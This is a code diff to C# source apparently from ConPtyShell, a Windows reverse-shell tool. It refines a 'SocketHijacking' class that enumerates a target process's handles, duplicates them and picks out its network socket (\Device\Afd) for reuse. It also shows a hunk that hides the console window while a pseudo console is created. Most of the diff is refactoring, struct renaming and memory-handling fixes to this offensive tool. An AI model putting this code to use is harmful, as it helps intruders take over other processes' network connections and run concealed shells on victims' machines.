@@ -55,8 +55,8 @@ public class DeadlockCheckHelper{
     }
 }
 
-public static class SocketHijacking{
-    
+public static class SocketHijacking {
+
     private const uint NTSTATUS_SUCCESS = 0x00000000;
     private const uint NTSTATUS_INFOLENGTHMISMATCH = 0xc0000004;
     private const uint NTSTATUS_BUFFEROVERFLOW = 0x80000005;
@@ -65,17 +65,54 @@ public static class SocketHijacking{
     private const int WSA_FLAG_OVERLAPPED = 0x1;
     private const int DUPLICATE_SAME_ACCESS = 0x2;
     private const int SystemHandleInformation = 16;
-        
+
     [StructLayout(LayoutKind.Sequential, Pack = 1)]
-    private struct SYSTEM_HANDLE
+    private struct SYSTEM_HANDLE_TABLE_ENTRY_INFO
     {
-        public ushort ProcessId;
-        public ushort CreatorBackTrackIndex;
-        public byte ObjectTypeNumber;
-        public byte HandleAttribute;
-        public ushort Handle;
+        public ushort UniqueProcessId;
+        public ushort CreatorBackTraceIndex;
+        public byte ObjectTypeIndex;
+        public byte HandleAttributes;
+        public ushort HandleValue;
         public IntPtr Object;
         public IntPtr GrantedAccess;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    private struct GENERIC_MAPPING
+    {
+        public int GenericRead;
+        public int GenericWrite;
+        public int GenericExecute;
+        public int GenericAll;
+    }
+
+    [StructLayout(LayoutKind.Sequential, Pack = 1)]
+    private struct OBJECT_TYPE_INFORMATION_V2
+    {
+        public UNICODE_STRING TypeName;
+        public uint TotalNumberOfObjects;
+        public uint TotalNumberOfHandles;
+        public uint TotalPagedPoolUsage;
+        public uint TotalNonPagedPoolUsage;
+        public uint TotalNamePoolUsage;
+        public uint TotalHandleTableUsage;
+        public uint HighWaterNumberOfObjects;// PeakObjectCount;
+        public uint HighWaterNumberOfHandles;// PeakHandleCount;
+        public uint HighWaterPagedPoolUsage;
+        public uint HighWaterNonPagedPoolUsage;
+        public uint HighWaterNamePoolUsage;
+        public uint HighWaterHandleTableUsage;
+        public uint InvalidAttributes;
+        public GENERIC_MAPPING GenericMapping;
+        public uint ValidAccessMask;
+        public byte SecurityRequired;//bool
+        public byte MaintainHandleCount;//bool
+        public byte TypeIndex;
+        public byte ReservedByte;
+        public uint PoolType;
+        public uint DefaultPagedPoolCharge;// PagedPoolUsage;
+        public uint DefaultNonPagedPoolCharge;//NonPagedPoolUsage;
     }
 
     public enum OBJECT_INFORMATION_CLASS : int
@@ -118,7 +155,7 @@ public static class SocketHijacking{
         QueryLimitedInformation = 0x00001000,
         Synchronize = 0x00100000
     }
-    
+
     [StructLayout(LayoutKind.Sequential)]
     private struct WSAData
     {
@@ -133,14 +170,14 @@ public static class SocketHijacking{
         public string szSystemStatus;
     }
 
-    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Auto)]
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
     private struct WSAPROTOCOLCHAIN {
         public int ChainLen;
-        [MarshalAs(UnmanagedType.ByValArray, SizeConst=7)]
+        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 7)]
         public uint[] ChainEntries;
     }
- 
-    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Auto)]
+
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
     private struct WSAPROTOCOL_INFO {
         public uint dwServiceFlags1;
         public uint dwServiceFlags2;
@@ -161,10 +198,10 @@ public static class SocketHijacking{
         public int iSecurityScheme;
         public uint dwMessageSize;
         public uint dwProviderReserved;
-        [MarshalAs(UnmanagedType.ByValTStr, SizeConst=256)]
+        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
         public string szProtocol;
     }
-    
+
     [StructLayout(LayoutKind.Sequential)]
     private struct SOCKADDR_IN
     {
@@ -173,10 +210,10 @@ public static class SocketHijacking{
         public uint sin_addr;
         public long sin_zero;
     }
-  
-    [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError=true)]
+
+    [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true)]
     private static extern Int32 WSAStartup(Int16 wVersionRequested, out WSAData wsaData);
-  
+
     [DllImport("WS2_32.DLL", CharSet = CharSet.Auto, SetLastError = true)]
     private static extern int WSADuplicateSocket(IntPtr socketHandle, int processId, ref WSAPROTOCOL_INFO pinnedBuffer);
 
@@ -188,14 +225,14 @@ public static class SocketHijacking{
 
     [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true, CallingConvention = CallingConvention.StdCall)]
     private static extern int getpeername(IntPtr s, ref SOCKADDR_IN name, ref int namelen);
-    
+
     [DllImport("kernel32.dll", SetLastError = true)]
     private static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);
 
     [DllImport("kernel32.dll", SetLastError = true)]
     [return: MarshalAs(UnmanagedType.Bool)]
     private static extern bool DuplicateHandle(IntPtr hSourceProcessHandle, IntPtr hSourceHandle, IntPtr hTargetProcessHandle, out IntPtr lpTargetHandle, uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);
-    
+
     [DllImport("kernel32.dll")]
     private static extern bool CloseHandle(IntPtr hObject);
 
@@ -219,7 +256,7 @@ public static class SocketHijacking{
         {
             uint result = (uint)NtQuerySystemInformation(infoClass, infoPtr, infoLength, ref infoLength);
             if (result == NTSTATUS_SUCCESS)
-                 return infoPtr;
+                return infoPtr;
             Marshal.FreeHGlobal(infoPtr);  //free pointer when not Successful
             if (result != NTSTATUS_INFOLENGTHMISMATCH && result != NTSTATUS_BUFFEROVERFLOW && result != NTSTATUS_BUFFERTOOSMALL)
             {
@@ -229,8 +266,44 @@ public static class SocketHijacking{
             infoPtr = Marshal.AllocHGlobal(infoLength);
         }
     }
-    
-    //helper method with "dynamic" buffer allocation
+
+    private static IntPtr QueryObjectTypesInfo() {
+        IntPtr ptrObjectTypesInformation = IntPtr.Zero;
+        ptrObjectTypesInformation = NtQueryObjectDynamic(IntPtr.Zero, OBJECT_INFORMATION_CLASS.ObjectAllTypesInformation, 0);
+        return ptrObjectTypesInformation;
+    }
+
+    private static long AlignUp(long address, long align) {
+        return (((address) + (align) - 1) & ~((align) - 1));
+    }
+
+    // this works only from win8 and above. If you need a more generic solution you need to use the (i+2) "way" of counting index types.
+    // credits for this goes to @0xrepnz
+    // more information here --> https://twitter.com/splinter_code/status/1400873009121013765
+    private static byte GetTypeIndexByName(string ObjectName){
+        byte TypeIndex = 0;
+        long TypesCount = 0;
+        IntPtr ptrTypesInfo = IntPtr.Zero;
+        ptrTypesInfo = QueryObjectTypesInfo();
+        TypesCount = Marshal.ReadIntPtr(ptrTypesInfo).ToInt64();
+        // create a pointer to the first element address of OBJECT_TYPE_INFORMATION_V2
+        IntPtr ptrTypesInfoCurrent = new IntPtr(ptrTypesInfo.ToInt64() + IntPtr.Size);
+        for (int i = 0; i < TypesCount; i++)
+        {
+            OBJECT_TYPE_INFORMATION_V2 Type = (OBJECT_TYPE_INFORMATION_V2)Marshal.PtrToStructure(ptrTypesInfoCurrent, typeof(OBJECT_TYPE_INFORMATION_V2));
+            // move pointer to next the OBJECT_TYPE_INFORMATION_V2 object
+            ptrTypesInfoCurrent = (IntPtr)(ptrTypesInfoCurrent.ToInt64() + AlignUp(Type.TypeName.MaximumLength, (long)IntPtr.Size) + Marshal.SizeOf(new OBJECT_TYPE_INFORMATION_V2()));
+            if (Type.TypeName.Length > 0 && Marshal.PtrToStringUni(Type.TypeName.Buffer, Type.TypeName.Length / 2) == ObjectName)
+            {
+                TypeIndex = Type.TypeIndex;
+                break;
+            }
+        }
+        Marshal.FreeHGlobal(ptrTypesInfo);
+        return TypeIndex;
+    }
+
+        //helper method with "dynamic" buffer allocation
     public static IntPtr NtQueryObjectDynamic(IntPtr handle, OBJECT_INFORMATION_CLASS infoClass, int infoLength)
     {
         if (infoLength == 0)
@@ -240,7 +313,6 @@ public static class SocketHijacking{
         while (true)
         {
             result = (uint)NtQueryObject(handle, infoClass, infoPtr, (uint)infoLength, ref infoLength);
-
             if (result == NTSTATUS_INFOLENGTHMISMATCH || result == NTSTATUS_BUFFEROVERFLOW || result == NTSTATUS_BUFFERTOOSMALL)
             {
                 Marshal.FreeHGlobal(infoPtr);
@@ -283,20 +355,22 @@ public static class SocketHijacking{
             Console.WriteLine("Cannot open target process with pid " + targetProcess.Id.ToString() + " for DuplicateHandle access");
             return socketHandle;
         }
+
         ptrHandlesInfo = NtQuerySystemInformationDynamic(SystemHandleInformation, 0);
-        HandlesCount = Marshal.ReadIntPtr(ptrHandlesInfo).ToInt64();    
-        // move pointer to the beginning of the address of SYSTEM_HANDLE[]
-        ptrHandlesInfo = new IntPtr(ptrHandlesInfo.ToInt64()+IntPtr.Size);
+        HandlesCount = Marshal.ReadIntPtr(ptrHandlesInfo).ToInt64();
+        // create a pointer at the beginning of the address of SYSTEM_HANDLE_TABLE_ENTRY_INFO[]
+        IntPtr ptrHandlesInfoCurrent = new IntPtr(ptrHandlesInfo.ToInt64()+IntPtr.Size);
+        // get TypeIndex for "File" objects, needed to filter only sockets objects
+        byte TypeIndexFileObject = GetTypeIndexByName("File");
         for(int i=0; i < HandlesCount; i++){
-            SYSTEM_HANDLE sysHandle = (SYSTEM_HANDLE)Marshal.PtrToStructure(ptrHandlesInfo, typeof(SYSTEM_HANDLE));
-            //move pointer to next SYSTEM_HANDLE
-            ptrHandlesInfo = (IntPtr)(ptrHandlesInfo.ToInt64() + Marshal.SizeOf(new SYSTEM_HANDLE()));
-            if(sysHandle.ProcessId != targetProcess.Id || sysHandle.ObjectTypeNumber != 0x25)
+            SYSTEM_HANDLE_TABLE_ENTRY_INFO sysHandle = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)Marshal.PtrToStructure(ptrHandlesInfoCurrent, typeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO));
+            //move pointer to next SYSTEM_HANDLE_TABLE_ENTRY_INFO
+            ptrHandlesInfoCurrent = (IntPtr)(ptrHandlesInfoCurrent.ToInt64() + Marshal.SizeOf(new SYSTEM_HANDLE_TABLE_ENTRY_INFO()));
+            if (sysHandle.UniqueProcessId != targetProcess.Id || sysHandle.ObjectTypeIndex != TypeIndexFileObject)
                 continue;
-            
-            if(DuplicateHandle(hTargetProcess, (IntPtr)sysHandle.Handle, GetCurrentProcess(), out dupHandle, 0, false, DUPLICATE_SAME_ACCESS)){
+            if(DuplicateHandle(hTargetProcess, (IntPtr)sysHandle.HandleValue, GetCurrentProcess(), out dupHandle, 0, false, DUPLICATE_SAME_ACCESS)){
                 if(deadlockCheckHelperObj.CheckDeadlockDetected(dupHandle)){ // this will avoids deadlocks on special named pipe handles
-                    //Console.WriteLine("Deadlock detected");
+                    //Console.WriteLine("debug: Deadlock detected");
                     CloseHandle(dupHandle);
                     continue;
                 }
@@ -308,20 +382,20 @@ public static class SocketHijacking{
                 objNameInfo = (OBJECT_NAME_INFORMATION)Marshal.PtrToStructure(ptrObjectName, typeof(OBJECT_NAME_INFORMATION));
                 if (objNameInfo.Name.Buffer != IntPtr.Zero && objNameInfo.Name.Length > 0 )
                 {
-                    strObjectName = Marshal.PtrToStringUni(objNameInfo.Name.Buffer);
-                    //Console.WriteLine("strObjectName " + strObjectName);
+                    strObjectName = Marshal.PtrToStringUni(objNameInfo.Name.Buffer, objNameInfo.Name.Length / 2);
+                    //Console.WriteLine("debug: strObjectName " + strObjectName);
                     if(strObjectName == "\\Device\\Afd"){
                         socketHandle = dupHandle;
                         break;
                     }
-                    else{
-                        if(ptrObjectName != IntPtr.Zero) Marshal.FreeHGlobal(ptrObjectName);
+                    else
                         CloseHandle(dupHandle);
-                    }
                 }
+                Marshal.FreeHGlobal(ptrObjectName);
                 CloseHandle(dupHandle);
             }
         }
+        Marshal.FreeHGlobal(ptrHandlesInfo);
         return socketHandle;
     }
     
@@ -898,7 +972,7 @@ public static class ConPtyShell
                 ShowWindow(GetConsoleWindow(), SW_HIDE);
                 newConsoleAllocated = true;
             }
-            //Console.WriteLine("Creating pseudo console...");
+            //Console.WriteLine("debug: Creating pseudo console...");
             //return "";
             int pseudoConsoleCreationResult = CreatePseudoConsoleWithPipes(ref handlePseudoConsole, ref InputPipeRead, ref OutputPipeWrite, rows, cols);
             if(pseudoConsoleCreationResult != 0)
